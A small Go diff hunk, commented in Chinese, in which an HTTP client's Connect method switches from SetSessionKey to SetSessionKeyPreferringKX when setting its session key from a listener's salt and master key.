@@ -109,7 +109,7 @@ func (s *HTTPClient) Connect(host string) error {
 
 	// 会话密钥
 	salt, masterKey := app.GetListenerKeyConfig("http")
-	if err := encrypt.GlobalClientKeyManager.SetSessionKey(salt[:16], masterKey[:32]); err != nil {
+	if err := encrypt.GlobalClientKeyManager.SetSessionKeyPreferringKX(salt[:16], masterKey[:32]); err != nil {
 		s.fail()
 		return err
 	}
